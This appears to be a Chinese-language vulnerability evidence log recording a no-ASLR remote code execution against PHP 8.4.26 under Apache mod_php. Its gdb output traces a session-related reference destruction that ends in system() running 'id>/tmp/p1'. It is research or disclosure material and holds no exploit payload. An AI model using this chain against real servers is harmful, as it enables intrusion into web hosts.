# no-ASLR RCE 证据记录

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php，no-ASLR worker
约束：纯 HTTP，未在目标 webroot 写任何 PHP；页面为普通 `echo`（历史记录：当次页面含 `session_start()`；该链不依赖它，已在纯 echo 页面复验）

## 1. 成功运行的 gdb 关键输出

```text
REF
ARR T
#0  zend_array_destroy (ht=0x7ffff5e6e0d8)
#1  0x00007ffff4a13c35 in i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#2  zend_reference_destroy (ref=0x7ffff5e02320)
#3  0x00007ffff47e77cf in php_session_track_init ()
HASH T
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  0x00007ffff49cbc9d in zend_hash_destroy (ht=ht@entry=0x7ffff5e6e0d8)
#2  0x00007ffff49cbff8 in zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  0x00007ffff4a13c35 in i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
